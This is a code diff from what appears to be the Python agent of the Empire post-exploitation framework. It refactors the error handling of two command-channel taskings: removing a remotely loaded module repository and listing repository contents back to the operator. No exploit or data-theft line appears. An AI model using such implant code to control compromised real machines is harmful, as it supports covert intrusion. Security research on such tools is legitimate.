@@ -431,20 +431,32 @@ def processPacket(taskingID, data):
 
     elif taskingID == 123:
         #Remove a module repo
-        repoName = str(data)
-        if remove_hook(repoName) == True:
+        repoName = data
+        try:
+            remove_hook(repoName)
             sendMessage(encodePacket(123, "%s repo successfully removed" % (repoName)))
-        else:
-            sendMessage(encodePacket(123, "Unable to locate or remove repo: %s" % (repoName)))
+        except Exception as e:
+            sendMessage(encodePacket(123, "Unable to remove repo: %s : %s" % (repoName, str(e))))
+            
 
     elif taskingID == 124:
         #List all module repos and their contents
-        loadedModules = "Empire Module Repo\n"
-        for key, value in moduleRepo.items():
-            loadedModules += 'Repo:' + key + ':\n'
-            loadedModules += '\n'.join(moduleRepo[key].namelist())
+        repoName = data
+        if repoName == "":
+            loadedModules = "\nAll Repos\n"
+            for key, value in moduleRepo.items():
+                loadedModules += "\n----"+key+"----\n"
+                loadedModules += '\n'.join(moduleRepo[key].namelist())
 
-        sendMessage(encodePacket(124, loadedModules))
+            sendMessage(encodePacket(124, loadedModules))
+        else:
+            try:
+                loadedModules = "\n----"+repoName+"----\n"
+                loadedModules += '\n'.join(moduleRepo[repoName].namelist())
+                sendMessage(encodePacket(124, loadedModules))
+            except Exception as e:
+                msg = "Unable to retrieve repo contents: %s" % (str(e))
+                sendMessage(encodePacket(124, msg))
 
     else:
         return encodePacket(0, "invalid tasking ID: %s" %(taskingID))
@@ -562,9 +574,6 @@ def remove_hook(repoName):
     if repoName in _meta_cache:
         finder = _meta_cache.pop(repoName)
         sys.meta_path.remove(finder)
-        return True
-    else:
-        return False
 
 ################################################
 #
